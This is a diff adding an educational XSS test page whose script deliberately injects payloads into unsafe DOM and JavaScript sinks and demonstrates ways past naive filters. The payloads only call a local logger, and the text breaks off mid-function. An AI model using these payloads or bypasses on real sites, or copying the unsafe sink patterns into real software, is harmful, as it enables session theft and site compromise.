@@ -1,0 +1,849 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS Vulnerability Test Page</title>
+  <script>
+    // Override browser dialogs immediately — before any element events can fire.
+    // Must be in <head> to guarantee it runs before autofocus, onload, etc.
+    window.alert   = function(msg) { if (window.xssAlert) xssAlert(String(msg), 'window.alert'); };
+    window.confirm = function(msg) { if (window.xssAlert) xssAlert(String(msg), 'window.confirm'); return true; };
+    window.prompt  = function(msg, def) { if (window.xssAlert) xssAlert(String(msg), 'window.prompt'); return def || ''; };
+  </script>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; }
+    body { font-family: system-ui, -apple-system, sans-serif; margin: 0; padding: 0; background: #0f0f0f; color: #e0e0e0; line-height: 1.6; }
+    header { background: #1a1a1a; border-bottom: 2px solid #d93025; padding: 1.5rem 2rem; }
+    header h1 { margin: 0; font-size: 1.6rem; color: #f28b82; }
+    header p { margin: 0.25rem 0 0; color: #999; font-size: 0.9rem; }
+    .warning-banner { background: #3c1f1c; border: 1px solid #d93025; color: #f28b82; padding: 0.75rem 2rem; font-size: 0.85rem; display: flex; align-items: center; gap: 0.5rem; }
+    main { max-width: 1000px; margin: 0 auto; padding: 1.5rem; }
+    section { background: #1a1a1a; border-radius: 10px; padding: 1.5rem; margin-bottom: 1.5rem; border: 1px solid #2a2a2a; }
+    section h2 { margin-top: 0; font-size: 1.1rem; color: #8ab4f8; border-bottom: 1px solid #2a2a2a; padding-bottom: 0.5rem; }
+    .test-row { display: flex; align-items: flex-start; gap: 1rem; padding: 0.75rem 0; border-bottom: 1px solid #222; }
+    .test-row:last-child { border-bottom: none; }
+    .test-info { flex: 1; }
+    .test-info strong { color: #e0e0e0; font-size: 0.9rem; }
+    .test-info .vector { font-family: monospace; font-size: 0.78rem; color: #aaa; margin-top: 0.2rem; word-break: break-all; background: #111; padding: 0.3rem 0.5rem; border-radius: 4px; }
+    .test-info .desc { font-size: 0.8rem; color: #777; margin-top: 0.25rem; }
+    .test-btn { background: #1e3a5f; color: #8ab4f8; border: 1px solid #3a5a8f; padding: 0.4rem 1rem; border-radius: 5px; cursor: pointer; font-size: 0.85rem; white-space: nowrap; transition: all 0.15s; }
+    .test-btn:hover { background: #2a4a7f; }
+    .status { width: 80px; text-align: center; font-size: 0.75rem; font-weight: 700; padding: 0.25rem 0.5rem; border-radius: 4px; white-space: nowrap; }
+    .status-pending { background: #2a2a2a; color: #666; }
+    .status-fired { background: #3c1f1c; color: #f28b82; }
+    .status-blocked { background: #1c2f1c; color: #81c995; }
+
+    /* Inline XSS banner — appears inside output areas when XSS fires */
+    .xss-banner { display: flex; align-items: flex-start; gap: 0.6rem; background: #2a0a0a; border: 1px solid #d93025; border-radius: 6px; padding: 0.6rem 0.75rem; margin-bottom: 0.5rem; animation: bannerIn 0.25s ease; }
+    .xss-banner .xss-icon { font-size: 1rem; flex-shrink: 0; margin-top: 0.05rem; }
+    .xss-banner .xss-label { font-size: 0.7rem; font-weight: 700; color: #f28b82; letter-spacing: 0.05em; text-transform: uppercase; }
+    .xss-banner .xss-detail { font-size: 0.8rem; color: #e0e0e0; font-family: monospace; word-break: break-all; }
+    .xss-banner .xss-via { font-size: 0.72rem; color: #666; margin-top: 0.1rem; }
+    @keyframes bannerIn { from { opacity: 0; transform: translateY(-4px); } to { opacity: 1; transform: translateY(0); } }
+
+    /* Row flash when XSS fires */
+    @keyframes rowFlash { 0%,100% { background: transparent; } 30% { background: rgba(217,48,37,0.15); } }
+    .test-row.xss-fired { animation: rowFlash 0.8s ease; }
+
+    /* Floating trigger counter */
+    #xss-counter { position: fixed; bottom: 1.5rem; right: 1.5rem; z-index: 100; display: flex; flex-direction: column; align-items: flex-end; gap: 0.5rem; pointer-events: none; }
+    #xss-badge { background: #d93025; color: #fff; font-size: 0.8rem; font-weight: 700; padding: 0.35rem 0.75rem; border-radius: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.4); opacity: 0; transition: opacity 0.3s; pointer-events: auto; cursor: default; }
+    #xss-badge.visible { opacity: 1; }
+
+    /* Mini toast for each trigger */
+    #xss-toast { background: #1a0000; border: 1px solid #d93025; color: #f28b82; font-size: 0.82rem; padding: 0.5rem 0.9rem; border-radius: 6px; box-shadow: 0 2px 8px rgba(0,0,0,0.4); opacity: 0; transform: translateY(6px); transition: opacity 0.25s, transform 0.25s; pointer-events: none; max-width: 260px; text-align: right; }
+    #xss-toast.show { opacity: 1; transform: translateY(0); }
+    #alert-count { display: none; }
+
+    /* Manual tester */
+    textarea { width: 100%; background: #111; color: #e0e0e0; border: 1px solid #333; border-radius: 6px; padding: 0.75rem; font-family: monospace; font-size: 0.85rem; resize: vertical; }
+    textarea:focus { outline: none; border-color: #8ab4f8; }
+    .inject-target { min-height: 60px; border: 1px dashed #444; border-radius: 6px; padding: 0.75rem; margin-top: 0.75rem; color: #777; font-size: 0.85rem; background: #111; }
+    .btn-row { display: flex; gap: 0.5rem; margin-top: 0.75rem; flex-wrap: wrap; }
+    button { background: #1e3a5f; color: #8ab4f8; border: 1px solid #3a5a8f; padding: 0.5rem 1rem; border-radius: 6px; cursor: pointer; font-size: 0.9rem; transition: all 0.15s; }
+    button:hover { background: #2a4a7f; }
+    .btn-danger { background: #3c1f1c; color: #f28b82; border-color: #5a2a2a; }
+    .btn-danger:hover { background: #4c2f2c; }
+    .btn-safe { background: #1c2f1c; color: #81c995; border-color: #2a4a2a; }
+    .btn-safe:hover { background: #2c3f2c; }
+
+    /* DOM sink playground */
+    .sink-row { margin-top: 0.75rem; }
+    .sink-label { font-size: 0.8rem; color: #777; margin-bottom: 0.25rem; }
+    input[type=text] { width: 100%; background: #111; color: #e0e0e0; border: 1px solid #333; border-radius: 6px; padding: 0.5rem 0.75rem; font-family: monospace; font-size: 0.85rem; }
+    input[type=text]:focus { outline: none; border-color: #8ab4f8; }
+    .sink-output { background: #111; border: 1px solid #222; border-radius: 6px; padding: 0.75rem; margin-top: 0.5rem; min-height: 40px; font-size: 0.85rem; }
+    .sink-output a { color: #8ab4f8; }
+
+    /* Cheatsheet */
+    .payload-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 0.75rem; }
+    .payload-card { background: #111; border: 1px solid #222; border-radius: 6px; padding: 0.75rem; }
+    .payload-card .label { font-size: 0.75rem; color: #777; margin-bottom: 0.25rem; }
+    .payload-card code { font-family: monospace; font-size: 0.8rem; color: #f28b82; word-break: break-all; display: block; }
+    .payload-card button { margin-top: 0.5rem; font-size: 0.75rem; padding: 0.25rem 0.6rem; }
+
+    footer { text-align: center; padding: 1.5rem; color: #444; font-size: 0.8rem; border-top: 1px solid #2a2a2a; margin-top: 2rem; }
+  </style>
+</head>
+<body>
+
+<header>
+  <h1>&#9888; XSS Vulnerability Test Page</h1>
+  <p>Tests common Cross-Site Scripting attack vectors — for security research and browser validation only</p>
+</header>
+
+<div class="warning-banner">
+  &#9888;&nbsp; <strong>Educational use only.</strong> This page intentionally contains XSS attack vectors to test browser security, CSP policies, and sanitization logic. <code>alert()</code>, <code>confirm()</code>, and <code>prompt()</code> are overridden — no browser dialogs will appear; all triggers are logged inline.
+</div>
+
+<main>
+
+  <!-- Reflected / URL-based XSS -->
+  <section>
+    <h2>1. Reflected XSS — URL / Hash Parameters</h2>
+    <p style="font-size:0.85rem; color:#777; margin-top:0;">Tests DOM sinks that read from the URL and reflect into the page without sanitization.</p>
+    <div class="test-row">
+      <div class="test-info">
+        <strong>Hash-based injection</strong>
+        <div class="vector">location.hash &#8594; innerHTML</div>
+        <div class="desc">The page reads <code>#xss=...</code> and injects into the DOM unsanitized</div>
+      </div>
+      <div class="status status-pending" id="s-hash">PENDING</div>
+      <button class="test-btn" onclick="testHashInjection()">Test</button>
+    </div>
+    <div class="test-row">
+      <div class="test-info">
+        <strong>URLSearchParams injection</strong>
+        <div class="vector">new URLSearchParams(location.search).get('q') &#8594; innerHTML</div>
+        <div class="desc">Reads <code>?q=</code> param and renders it as HTML</div>
+      </div>
+      <div class="status status-pending" id="s-params">PENDING</div>
+      <button class="test-btn" onclick="testParamInjection()">Test</button>
+    </div>
+    <div class="test-row">
+      <div class="test-info">
+        <strong>document.referrer reflection</strong>
+        <div class="vector">document.referrer &#8594; innerHTML</div>
+        <div class="desc">Reflects the HTTP Referer header into the DOM</div>
+      </div>
+      <div class="status status-pending" id="s-referrer">PENDING</div>
+      <button class="test-btn" onclick="testReferrerInjection()">Test</button>
+    </div>
+    <div id="reflected-output" class="inject-target">Reflected output will appear here</div>
+  </section>
+
+  <!-- innerHTML / DOM injection -->
+  <section>
+    <h2>2. DOM Injection Sinks</h2>
+    <p style="font-size:0.85rem; color:#777; margin-top:0;">Direct injection into unsafe DOM APIs.</p>
+    <div class="test-row">
+      <div class="test-info">
+        <strong>innerHTML (script tag)</strong>
+        <div class="vector">el.innerHTML = '&lt;script&gt;xssAlert("innerHTML script")&lt;/script&gt;'</div>
+        <div class="desc">Script tags injected via innerHTML are NOT executed by modern browsers</div>
+      </div>
+      <div class="status status-pending" id="s-inner-script">PENDING</div>
+      <button class="test-btn" onclick="testInnerHTMLScript()">Test</button>
+    </div>
+    <div class="test-row">
+      <div class="test-info">
+        <strong>innerHTML (img onerror)</strong>
+        <div class="vector">el.innerHTML = '&lt;img src=x onerror=xssAlert("img onerror")&gt;'</div>
+        <div class="desc">Event handlers on injected elements DO execute — this fires</div>
+      </div>
+      <div class="status status-pending" id="s-inner-img">PENDING</div>
+      <button class="test-btn" onclick="testInnerHTMLImg()">Test</button>
+    </div>
+    <div class="test-row">
+      <div class="test-info">
+        <strong>innerHTML (svg onload)</strong>
+        <div class="vector">el.innerHTML = '&lt;svg onload=xssAlert("svg onload")&gt;&lt;/svg&gt;'</div>
+        <div class="desc">SVG elements with event handlers execute inline JS</div>
+      </div>
+      <div class="status status-pending" id="s-inner-svg">PENDING</div>
+      <button class="test-btn" onclick="testInnerHTMLSVG()">Test</button>
+    </div>
+    <div class="test-row">
+      <div class="test-info">
+        <strong>innerHTML (body onload via svg)</strong>
+        <div class="vector">el.innerHTML = '&lt;svg&gt;&lt;animate onbegin=xssAlert("animate onbegin")&gt;&lt;/svg&gt;'</div>
+        <div class="desc">SVG animate element with onbegin event handler</div>
+      </div>
+      <div class="status status-pending" id="s-inner-animate">PENDING</div>
+      <button class="test-btn" onclick="testInnerHTMLAnimate()">Test</button>
+    </div>
+    <div class="test-row">
+      <div class="test-info">
+        <strong>outerHTML replacement</strong>
+        <div class="vector">el.outerHTML = '&lt;img src=x onerror=xssAlert("outerHTML")&gt;'</div>
+        <div class="desc">outerHTML replaces the target element entirely — event handlers fire</div>
+      </div>
+      <div class="status status-pending" id="s-outerhtml">PENDING</div>
+      <button class="test-btn" onclick="testOuterHTML()">Test</button>
+    </div>
+    <div class="test-row">
+      <div class="test-info">
+        <strong>insertAdjacentHTML</strong>
+        <div class="vector">el.insertAdjacentHTML('beforeend', '&lt;img src=x onerror=xssAlert("insertAdjacentHTML")&gt;')</div>
+        <div class="desc">insertAdjacentHTML is equally unsafe as innerHTML</div>
+      </div>
+      <div class="status status-pending" id="s-adjacent">PENDING</div>
+      <button class="test-btn" onclick="testInsertAdjacentHTML()">Test</button>
+    </div>
+    <div class="test-row">
+      <div class="test-info">
+        <strong>document.write</strong>
+        <div class="vector">document.write('&lt;img src=x onerror=xssAlert("document.write")&gt;')</div>
+        <div class="desc">document.write executes immediately and is a classic XSS sink</div>
+      </div>
+      <div class="status status-pending" id="s-docwrite">PENDING</div>
+      <button class="test-btn" onclick="testDocumentWrite()">Test</button>
+    </div>
+    <div id="dom-sink-output" class="inject-target">DOM injection output will appear here</div>
+  </section>
+
+  <!-- JS execution sinks -->
+  <section>
+    <h2>3. JavaScript Execution Sinks</h2>
+    <p style="font-size:0.85rem; color:#777; margin-top:0;">Sinks that directly execute JavaScript strings.</p>
+    <div class="test-row">
+      <div class="test-info">
+        <strong>eval()</strong>
+        <div class="vector">eval('xssAlert("eval")')</div>
+        <div class="desc">Directly executes a string as JavaScript code</div>
+      </div>
+      <div class="status status-pending" id="s-eval">PENDING</div>
+      <button class="test-btn" onclick="testEval()">Test</button>
+    </div>
+    <div class="test-row">
+      <div class="test-info">
+        <strong>Function() constructor</strong>
+        <div class="vector">new Function('xssAlert("Function constructor")()')</div>
+        <div class="desc">Creates a new function from a string — equivalent to eval</div>
+      </div>
+      <div class="status status-pending" id="s-func">PENDING</div>
+      <button class="test-btn" onclick="testFunctionConstructor()">Test</button>
+    </div>
+    <div class="test-row">
+      <div class="test-info">
+        <strong>setTimeout (string)</strong>
+        <div class="vector">setTimeout('xssAlert("setTimeout string")', 0)</div>
+        <div class="desc">Passing a string (not a function) to setTimeout executes it as code</div>
+      </div>
+      <div class="status status-pending" id="s-settimeout">PENDING</div>
+      <button class="test-btn" onclick="testSetTimeoutString()">Test</button>
+    </div>
+    <div class="test-row">
+      <div class="test-info">
+        <strong>setInterval (string)</strong>
+        <div class="vector">setInterval('xssAlert("setInterval string")', 10)</div>
+        <div class="desc">Same as setTimeout — string arg is executed as code</div>
+      </div>
+      <div class="status status-pending" id="s-setinterval">PENDING</div>
+      <button class="test-btn" onclick="testSetIntervalString()">Test</button>
+    </div>
+    <div id="jssink-output" class="inject-target">JS sink output will appear here</div>
+  </section>
+
+  <!-- javascript: URLs -->
+  <section>
+    <h2>4. javascript: URL Scheme</h2>
+    <p style="font-size:0.85rem; color:#777; margin-top:0;">Using <code>javascript:</code> as a URL in href, src, action, and similar attributes.</p>
+    <div class="test-row">
+      <div class="test-info">
+        <strong>Anchor href</strong>
+        <div class="vector">&lt;a href="javascript:xssAlert('href')"&gt;Click me&lt;/a&gt;</div>
+        <div class="desc">Clicking this link executes the JavaScript expression</div>
+      </div>
+      <div class="status status-pending" id="s-href">PENDING</div>
+      <button class="test-btn" onclick="testJavascriptHref()">Inject Link</button>
+    </div>
+    <div class="test-row">
+      <div class="test-info">
+        <strong>location.href assignment</strong>
+        <div class="vector">location.href = 'javascript:xssAlert("location.href")'</div>
+        <div class="desc">Navigating to a javascript: URL executes it</div>
+      </div>
+      <div class="status status-pending" id="s-lochref">PENDING</div>
+      <button class="test-btn" onclick="testLocationHref()">Test</button>
+    </div>
+    <div class="test-row">
+      <div class="test-info">
+        <strong>iframe src</strong>
+        <div class="vector">&lt;iframe src="javascript:parent.xssAlert('iframe js url')"&gt;&lt;/iframe&gt;</div>
+        <div class="desc">javascript: URL in iframe src executes in the iframe context</div>
+      </div>
+      <div class="status status-pending" id="s-iframe-js">PENDING</div>
+      <button class="test-btn" onclick="testIframeJSSrc()">Test</button>
+    </div>
+    <div id="jsurl-output" class="inject-target">javascript: URL output will appear here</div>
+  </section>
+
+  <!-- Event handler injection -->
+  <section>
+    <h2>5. Event Handler Injection</h2>
+    <p style="font-size:0.85rem; color:#777; margin-top:0;">Injecting HTML attributes that contain inline JavaScript.</p>
+    <div class="test-row">
+      <div class="test-info">
+        <strong>onmouseover</strong>
+        <div class="vector">&lt;a onmouseover=xssAlert('onmouseover')&gt;Hover me&lt;/a&gt;</div>
+        <div class="desc">Mouse event handlers fire on user interaction</div>
+      </div>
+      <div class="status status-pending" id="s-mouseover">PENDING</div>
+      <button class="test-btn" onclick="testMouseover()">Inject — Hover Result</button>
+    </div>
+    <div class="test-row">
+      <div class="test-info">
+        <strong>autofocus onfocus</strong>
+        <div class="vector">&lt;input autofocus onfocus=xssAlert('autofocus')&gt;</div>
+        <div class="desc">autofocus triggers onfocus automatically on page load/injection</div>
+      </div>
+      <div class="status status-pending" id="s-autofocus">PENDING</div>
+      <button class="test-btn" onclick="testAutofocus()">Test</button>
+    </div>
+    <div class="test-row">
+      <div class="test-info">
+        <strong>onanimationstart</strong>
+        <div class="vector">&lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;div style="animation:x" onanimationstart=xssAlert('animation')&gt;</div>
+        <div class="desc">CSS animation start triggers the event handler immediately</div>
+      </div>
+      <div class="status status-pending" id="s-animation">PENDING</div>
+      <button class="test-btn" onclick="testAnimationStart()">Test</button>
+    </div>
+    <div id="event-output" class="inject-target">Event handler output will appear here</div>
+  </section>
+
+  <!-- Encoding bypasses -->
+  <section>
+    <h2>6. Encoding &amp; Filter Bypasses</h2>
+    <p style="font-size:0.85rem; color:#777; margin-top:0;">Payloads that evade naive keyword-based filters.</p>
+    <div class="test-row">
+      <div class="test-info">
+        <strong>HTML entity encoding</strong>
+        <div class="vector">&lt;img src=x onerror=&#x78;&#x73;&#x73;&#x41;&#x6c;&#x65;&#x72;&#x74;('entities')&gt;</div>
+        <div class="desc">Attribute values are decoded before execution — entity encoding bypasses string filters</div>
+      </div>
+      <div class="status status-pending" id="s-entities">PENDING</div>
+      <button class="test-btn" onclick="testEntities()">Test</button>
+    </div>
+    <div class="test-row">
+      <div class="test-info">
+        <strong>Mixed case</strong>
+        <div class="vector">&lt;ScRiPt&gt;xssAlert('mixed case')&lt;/sCrIpT&gt; via document.write</div>
+        <div class="desc">HTML parsing is case-insensitive — case-based filters are trivially bypassed</div>
+      </div>
+      <div class="status status-pending" id="s-mixedcase">PENDING</div>
+      <button class="test-btn" onclick="testMixedCase()">Test</button>
+    </div>
+    <div class="test-row">
+      <div class="test-info">
+        <strong>SVG namespace bypass</strong>
+        <div class="vector">&lt;svg&gt;&lt;script&gt;xssAlert('svg script')&lt;/script&gt;&lt;/svg&gt;</div>
+        <div class="desc">Scripts inside SVG tags execute — unlike scripts in HTML via innerHTML</div>
+      </div>
+      <div class="status status-pending" id="s-svgscript">PENDING</div>
+      <button class="test-btn" onclick="testSVGScript()">Test</button>
+    </div>
+    <div class="test-row">
+      <div class="test-info">
+        <strong>Double encoding</strong>
+        <div class="vector">%253Cscript%253E decoded twice to &lt;script&gt;</div>
+        <div class="desc">Servers that decode once before sanitizing miss double-encoded payloads</div>
+      </div>
+      <div class="status status-pending" id="s-double-enc">PENDING</div>
+      <button class="test-btn" onclick="testDoubleEncoding()">Test</button>
+    </div>
+    <div id="bypass-output" class="inject-target">Bypass test output will appear here</div>
+  </section>
+
+  <!-- DOM Sinks Playground -->
+  <section>
+    <h2>7. DOM Sink Playground</h2>
+    <p style="font-size:0.85rem; color:#777; margin-top:0;">Type a payload and inject it into various DOM sinks to observe behavior.</p>
+
+    <div class="sink-row">
+      <div class="sink-label">Payload</div>
+      <input type="text" id="payload-input" value="&lt;img src=x onerror=xssAlert('custom')&gt;" placeholder="Enter XSS payload...">
+    </div>
+
+    <div class="btn-row">
+      <button onclick="sinkInject('innerHTML')">&#8594; innerHTML</button>
+      <button onclick="sinkInject('outerHTML')">&#8594; outerHTML</button>
+      <button onclick="sinkInject('insertAdjacentHTML')">&#8594; insertAdjacentHTML</button>
+      <button onclick="sinkInject('textContent')">&#8594; textContent (safe)</button>
+      <button onclick="sinkInject('innerText')">&#8594; innerText (safe)</button>
+      <button onclick="sinkInject('createTextNode')">&#8594; createTextNode (safe)</button>
+      <button class="btn-danger" onclick="sinkInject('eval')">&#8594; eval()</button>
+    </div>
+
+    <div class="sink-label" style="margin-top:1rem;">Output — <span id="sink-label-current" style="color:#f28b82;">select a sink above</span></div>
+    <div id="sink-output" class="sink-output">Output appears here</div>
+
+    <div class="sink-row" style="margin-top:1rem;">
+      <div class="sink-label">Unsafe link sink (location.href) — only navigate to javascript: or safe URLs</div>
+      <input type="text" id="href-input" value="javascript:xssAlert('href assignment')" placeholder="javascript:... or https://...">
+      <div class="btn-row">
+        <button onclick="testHrefSink()">Assign to location.href</button>
+        <button onclick="testAnchorSink()">Inject as &lt;a href=...&gt;</button>
+      </div>
+      <div id="href-output" class="sink-output" style="margin-top:0.5rem;"></div>
+    </div>
+  </section>
+
+  <!-- Stored XSS simulation -->
+  <section>
+    <h2>8. Stored XSS Simulation</h2>
+    <p style="font-size:0.85rem; color:#777; margin-top:0;">Simulates persisting a payload to localStorage and rendering it unsafely on the next "page load".</p>
+    <div class="sink-row">
+      <div class="sink-label">Payload to "store" (simulates a database write)</div>
+      <input type="text" id="stored-input" value="&lt;img src=x onerror=xssAlert('stored XSS fired!')&gt;">
+    </div>
+    <div class="btn-row">
+      <button onclick="storePayload()">Save to localStorage</button>
+      <button onclick="renderStoredUnsafe()" class="btn-danger">Render Stored (unsafe)</button>
+      <button onclick="renderStoredSafe()" class="btn-safe">Render Stored (safe)</button>
+      <button onclick="clearStoredPayload()">Clear</button>
+    </div>
+    <div id="stored-output" class="sink-output" style="margin-top:0.75rem;">Stored output renders here</div>
+  </section>
+
+  <!-- Payload cheatsheet -->
+  <section>
+    <h2>9. Common Payload Reference</h2>
+    <p style="font-size:0.85rem; color:#777; margin-top:0;">Click any payload to copy it to the clipboard.</p>
+    <div class="payload-grid" id="payload-grid"></div>
+  </section>
+
+</main>
+
+<!-- Floating XSS trigger counter -->
+<div id="xss-counter">
+  <div id="xss-toast"></div>
+  <div id="xss-badge"><span id="alert-count">0</span> XSS triggered</div>
+</div>
+
+<footer>
+  XSS Vulnerability Test Page &mdash; for security research, browser validation, and educational use only
+</footer>
+
+<script>
+  var triggerCount = 0;
+  var toastTimer = null;
+
+  function xssAlert(msg, source) {
+    triggerCount++;
+    document.getElementById('alert-count').textContent = triggerCount;
+
+    // Show/update the floating badge
+    var badge = document.getElementById('xss-badge');
+    badge.classList.add('visible');
+
+    // Show mini toast bottom-right
+    var toast = document.getElementById('xss-toast');
+    toast.textContent = '\u26a0 XSS fired: ' + String(msg);
+    toast.classList.add('show');
+    if (toastTimer) clearTimeout(toastTimer);
+    toastTimer = setTimeout(function() { toast.classList.remove('show'); }, 2500);
+
+    // Inject inline banner — use active output area, or fall back to floating toast only
+    var target = window._xssOutput || null;
+    if (target) {
+      var banner = document.createElement('div');
+      banner.className = 'xss-banner';
+      banner.innerHTML =
+        '<div class="xss-icon">\u26a0</div>' +
+        '<div><div class="xss-label">XSS Executed</div>' +
+        '<div class="xss-detail">' + escapeHTML(String(msg)) + '</div>' +
+        (source ? '<div class="xss-via">via ' + escapeHTML(source) + '</div>' : '') +
+        '</div>';
+      target.insertBefore(banner, target.firstChild);
+    }
+
+    return msg;
+  }
+
+  // Re-assign overrides now that xssAlert is defined, removing the early guard
+  window.alert   = function(msg) { xssAlert(String(msg), 'window.alert'); };
+  window.confirm = function(msg) { xssAlert(String(msg), 'window.confirm'); return true; };
+  window.prompt  = function(msg, def) { xssAlert(String(msg), 'window.prompt'); return def || ''; };
+
+  function escapeHTML(str) {
+    return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+  }
+
+  function clearLog() {
+    triggerCount = 0;
+    document.getElementById('alert-count').textContent = '0';
+    document.getElementById('xss-badge').classList.remove('visible');
+  }
+
+  function setStatus(id, fired) {
+    var el = document.getElementById(id);
+    if (!el) return;
+    el.className = 'status ' + (fired ? 'status-fired' : 'status-blocked');
+    el.textContent = fired ? 'FIRED' : 'BLOCKED';
+  }
+
+  // ---- Reflected XSS Tests ----
+
+  function testHashInjection() {
+    var output = document.getElementById('reflected-output');
+    window._xssOutput = output;
+    var before = triggerCount;
+    var prev = location.hash;
+    location.hash = '#xss=<img src=x onerror=xssAlert("hash injection")>';
+    // Extract and inject the hash value
+    var hashVal = decodeURIComponent(location.hash.replace(/^#xss=/, ''));
+    output.innerHTML = hashVal;
+    location.hash = prev;
+    setTimeout(function() { setStatus('s-hash', triggerCount > before); }, 100);
+  }
+
+  function testParamInjection() {
+    var output = document.getElementById('reflected-output');
+    window._xssOutput = output;
+    var before = triggerCount;
+    // Simulate reading from search params
+    var fakeParams = new URLSearchParams('q=<img src=x onerror=xssAlert("URLSearchParams injection")>');
+    var q = fakeParams.get('q');
+    output.innerHTML = q;
+    setTimeout(function() { setStatus('s-params', triggerCount > before); }, 100);
+  }
+
+  function testReferrerInjection() {
+    var output = document.getElementById('reflected-output');
+    window._xssOutput = output;
+    var before = triggerCount;
+    // Simulate a referrer-like value (we can't control real referrer, so we simulate the sink)
+    var fakeReferrer = '<img src=x onerror=xssAlert("referrer injection")>';
+    output.innerHTML = 'Simulated referrer: ' + fakeReferrer;
+    setTimeout(function() { setStatus('s-referrer', triggerCount > before); }, 100);
+  }
+
+  // ---- DOM Injection Tests ----
+
+  function testInnerHTMLScript() {
+    var output = document.getElementById('dom-sink-output');
+    window._xssOutput = output;
+    var before = triggerCount;
+    output.innerHTML = '<script>xssAlert("innerHTML script")<\/script>';
+    setTimeout(function() { setStatus('s-inner-script', triggerCount > before); }, 200);
+  }
+
+  function testInnerHTMLImg() {
+    var output = document.getElementById('dom-sink-output');
+    window._xssOutput = output;
+    var before = triggerCount;
+    output.innerHTML = '<img src=x onerror=xssAlert("innerHTML img onerror")>';
+    setTimeout(function() { setStatus('s-inner-img', triggerCount > before); }, 200);
+  }
+
+  function testInnerHTMLSVG() {
+    var output = document.getElementById('dom-sink-output');
+    window._xssOutput = output;
+    var before = triggerCount;
+    output.innerHTML = '<svg onload=xssAlert("innerHTML svg onload")></svg>';
+    setTimeout(function() { setStatus('s-inner-svg', triggerCount > before); }, 200);
+  }
+
+  function testInnerHTMLAnimate() {
+    var output = document.getElementById('dom-sink-output');
+    window._xssOutput = output;
+    var before = triggerCount;
+    output.innerHTML = '<svg><animate onbegin=xssAlert("svg animate onbegin") dur="1s"></animate></svg>';
+    setTimeout(function() { setStatus('s-inner-animate', triggerCount > before); }, 500);
+  }
+
+  function testOuterHTML() {
+    var target = document.createElement('span');
+    target.id = 'outerhtml-target';
+    target.textContent = 'replace me';
+    var output = document.getElementById('dom-sink-output');
+    window._xssOutput = output;
+    output.appendChild(target);
+    var before = triggerCount;
+    document.getElementById('outerhtml-target').outerHTML = '<img src=x onerror=xssAlert("outerHTML img onerror")>';
+    setTimeout(function() { setStatus('s-outerhtml', triggerCount > before); }, 200);
+  }
+
+  function testInsertAdjacentHTML() {
+    var output = document.getElementById('dom-sink-output');
+    window._xssOutput = output;
+    var before = triggerCount;
+    output.insertAdjacentHTML('beforeend', '<img src=x onerror=xssAlert("insertAdjacentHTML img onerror")>');
+    setTimeout(function() { setStatus('s-adjacent', triggerCount > before); }, 200);
+  }
+
+  function testDocumentWrite() {
+    // Can't use document.write on existing page safely — simulate via iframe
+    window._xssOutput = document.getElementById('dom-sink-output');
+    var before = triggerCount;
+    var iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.sandbox = 'allow-scripts allow-same-origin';
+    document.body.appendChild(iframe);
+    iframe.contentDocument.open();
+    iframe.contentDocument.write('<img src=x onerror="parent.xssAlert(\'document.write img onerror\')">');
+    iframe.contentDocument.close();
+    setTimeout(function() { setStatus('s-docwrite', triggerCount > before); document.body.removeChild(iframe); }, 300);
+  }
+
+  // ---- JS Execution Sinks ----
+
+  function testEval() {
+    window._xssOutput = document.getElementById('jssink-output');
+    var before = triggerCount;
+    try { eval('xssAlert("eval execution")'); } catch(e) {}
+    setStatus('s-eval', triggerCount > before);
+  }
+
+  function testFunctionConstructor() {
+    window._xssOutput = document.getElementById('jssink-output');
+    var before = triggerCount;
+    try { new Function('xssAlert("Function constructor")')(); } catch(e) {}
+    setStatus('s-func', triggerCount > before);
+  }
+
+  function testSetTimeoutString() {
+    window._xssOutput = document.getElementById('jssink-output');
+    var before = triggerCount;
+    setTimeout('xssAlert("setTimeout string argument")', 10);
+    setTimeout(function() { setStatus('s-settimeout', triggerCount > before); }, 200);
+  }
+
+  var siTimer = null;
+  function testSetIntervalString() {
+    window._xssOutput = document.getElementById('jssink-output');
+    var before = triggerCount;
+    siTimer = setInterval('xssAlert("setInterval string argument"); clearInterval(siTimer);', 10);
+    setTimeout(function() { setStatus('s-setinterval', triggerCount > before); }, 300);
+  }
+
+  // ---- javascript: URL Tests ----
+
+  function testJavascriptHref() {
+    var output = document.getElementById('jsurl-output');
+    window._xssOutput = output;
+    var before = triggerCount;
+    output.innerHTML = '<a href="javascript:xssAlert(\'anchor href javascript:\')" style="color:#8ab4f8; font-size:0.9rem; padding:0.25rem 0.5rem; border:1px solid #333; border-radius:4px;">&#9654; Click this injected link to trigger</a>';
+    setStatus('s-href', null); // Can't auto-detect without click
+    document.getElementById('s-href').className = 'status status-pending';
+    document.getElementById('s-href').textContent = 'CLICK';
+  }
+
+  function testLocationHref() {
+    window._xssOutput = document.getElementById('jsurl-output');
+    var before = triggerCount;
+    // Assign javascript: URL to location.href
+    location.href = 'javascript:xssAlert("location.href assignment")';
+    setTimeout(function() { setStatus('s-lochref', triggerCount > before); }, 100);
+  }
+
+  function testIframeJSSrc() {
+    var output = document.getElementById('jsurl-output');
+    window._xssOutput = output;
+    var before = triggerCount;
+    var iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = 'javascript:parent.xssAlert("iframe javascript: src")';
+    output.appendChild(iframe);
+    setTimeout(function() { setStatus('s-iframe-js', triggerCount > before); }, 300);
+  }
+
+  // ---- Event Handler Tests ----
+
+  function testMouseover() {
+    var output = document.getElementById('event-output');
+    window._xssOutput = output;
+    output.innerHTML = '<a onmouseover="xssAlert(\'onmouseover fired\')" style="color:#8ab4f8; padding:0.5rem; border:1px solid #333; border-radius:4px; cursor:pointer;">&#128073; Hover here to trigger onmouseover</a>';
+    document.getElementById('s-mouseover').className = 'status status-pending';
+    document.getElementById('s-mouseover').textContent = 'HOVER';
+  }
+
+  function testAutofocus() {
+    var output = document.getElementById('event-output');
+    window._xssOutput = output;
+    var before = triggerCount;
+    output.innerHTML = '<input autofocus onfocus="xssAlert(\'autofocus onfocus fired\')" style="background:#111; border:1px solid #444; color:#e0e0e0; padding:0.25rem;" placeholder="autofocus target">';
